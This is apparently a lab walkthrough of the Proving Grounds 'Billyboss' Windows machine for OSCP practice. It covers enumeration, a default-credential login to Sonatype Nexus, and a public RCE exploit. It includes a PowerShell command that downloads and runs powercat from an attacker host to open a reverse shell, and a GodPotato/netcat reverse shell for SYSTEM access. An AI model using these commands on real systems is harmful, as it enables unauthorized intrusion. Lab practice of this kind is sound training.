---
title: Billyboss
date: 2025-04-15
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough] 
image: istockphoto.jpg
media_subpath: /assets/img/posts/2025-04-15-billyboss/
---
## Introduction
In this walkthrough we will be solving Proving Grounds Intermediate Windows box Billyboss. Let’s start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Run UDP scan on top 100 ports to not o miss anything valuable

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

No valuable UDP ports are found.

### Full Nmap Scan

While interacting with other services run full Nmap port scan in the background.

```bash
sudo nmap -p- -sV -sC $IP --open  
```

## Services

### Port 21

Anonymous login is not allowed

![image.png](image%202.png)

### Port 139/445

Null session is not allowed 

```bash
smbclient -L //$IP/ -N
```

Enum4linux does not return anything useful:

```bash
enum4linux $IP
```

## Web

### Port 80

- Version - Microsoft IIS httpd 10.0
- Accessing the web page we are presented with BaGet application
- runnin ffuf

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://$IP/FUZZ -fs 2166
```

![image.png](image%203.png)

**Nothing returned**

### Port 8081

- Version - **Jetty 9.4.18.v20190429**

![image.png](image%204.png)

- Accessing the web page we are presented with **Sonatype Nexus 3.21** for that I found a public exploit for

```bash
searchsploit Nexus
```

![image.png](image%205.png)

- **Directory Fuzzing**

```bash
gobuster dir -u http://$IP:8081/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42
```

![image.png](image%206.png)

## Exploitation

I checked **admin:admin**, **admin:password**, **admin:admin123** but they did not work then I searched in google for some time for default credentials of **Sonatype Nexus**, and under default credentials seclists in kali

```bash
 grep -r "Sonatype Nexus"
```

> The command `grep -r "Sonatype Nexus"` searches for the string **`"Sonatype Nexus"`** recursively in all files and directories starting from your current location.
{: .prompt-info}

it returned **nexus:nexus**

We were able to login:

![image.png](image%207.png)

As we found credentials we can proceed to leveraing found [exploit](https://www.exploit-db.com/exploits/49385)

I encoded this command to base64 and used powercat.ps1 method:

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.237/powercat.ps1');powercat -c 192.168.45.237 -p 445 -e cmd"
```

![image.png](image%208.png)

We have got a shell:

![image.png](image%209.png)

## Privilege Escalation

- [ ]  Situational Awareness
- [ ]  User/Group Privileges
- [ ]  PowerShell History(Transcription, Script Logging)
- [ ]  Sensitive Files
- [ ]  Insecure Service Executables
- [ ]  DLL hijacking
- [ ]  Unquoted Service Path
- [ ]  Application-based exploits
- [ ]  Kernel Exploits
- [ ]  Check root, user home, Documents, Desktop, Downloads directories.

I checked privileges:

![image.png](image%2010.png)

It turns out we have **SeImpersonatePrivilege** we can use [GodPotato](https://github.com/BeichenDream/GodPotato)

Run this command to identify .NET version used on the target: 

```powershell
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
```

I created a new directory and transferred files to that directory:

![image.png](image%2011.png)

And run this command: 

```powershell
.\GodPotato-NET4.exe -cmd ".\nc64.exe -e cmd.exe 192.168.45.237 445"
```

![image.png](image%2012.png)

Now we are nt authority\system !

## Mitigation

- Do not use default credentials
- Update Sonatype Nexus application to safe version
- Do not give excessive privileges if not necessary
